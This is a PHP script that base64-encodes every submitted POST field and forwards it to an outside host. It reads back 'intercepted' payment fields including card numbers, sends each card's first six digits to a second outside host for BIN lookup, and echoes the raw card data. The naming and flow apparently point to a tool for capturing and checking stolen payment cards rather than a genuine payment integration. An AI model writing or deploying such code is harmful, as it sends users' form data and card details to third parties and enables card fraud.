<?php
header('Content-Type: application/json');

$data = $_POST;
$json = json_encode($data);
$base64 = base64_encode($json);
$url = 'https://pesaflow.fly.dev/?obj=' . urlencode($base64);

// Fetch from Cybersource proxy
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Accept: application/json']);
$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$error = curl_error($ch);
curl_close($ch);

// Fail on cURL error
if ($error) {
    echo json_encode(['success' => false, 'error' => 'Curl error: ' . $error]);
    exit;
}

// Try decoding
$parsed = json_decode($response, true);

// Fail on invalid JSON
if (!$parsed || !isset($parsed['intercepted'][0]['fields'])) {
    echo json_encode([
        'success' => false,
        'error' => 'Unexpected token or invalid JSON structure',
        'http_code' => $httpCode,
        'raw_response' => $response
    ]);
    exit;
}

$fields = $parsed['intercepted'][0]['fields'];

// Interpret Cybersource response
$_POST = $fields;
ob_start();
include 'cybersrc.php';
$interpreted = json_decode(ob_get_clean(), true);

// Lookup BIN data
$bin = substr(preg_replace('/\\D/', '', $fields['card_number'] ?? ''), 0, 6);
$binData = [];
if ($bin) {
    $binUrl = 'https://payment.tsavo.site/get_bin.php?bin=' . urlencode($bin);
    $ch = curl_init($binUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $binResp = curl_exec($ch);
    if (!curl_error($ch)) {
        $binData = json_decode($binResp, true);
    }
    curl_close($ch);
}

// Return combined interpretation
echo json_encode([
    'success' => true,
    'cybersource_interpretation' => $interpreted,
    'bin_info' => $binData,
    'raw_fields' => $fields
]);
